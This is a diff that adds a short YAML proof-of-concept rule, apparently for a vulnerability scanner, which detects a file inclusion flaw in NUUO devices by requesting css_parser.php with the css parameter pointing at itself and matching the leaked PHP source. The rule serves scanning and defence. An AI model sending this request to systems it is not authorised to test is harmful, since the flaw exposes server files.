@@ -1,0 +1,13 @@
+name: poc-yaml-nuuo-file-inclusion
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /css_parser.php?css=css_parser.php
+            follow_redirects: false
+        expression: response.status == 200 && response.headers["content-type"] == "text/css" && response.body.bcontains(b"$_GET['css']")
+expression: r0()
+detail:
+    links:
+        - https://www.exploit-db.com/exploits/40211
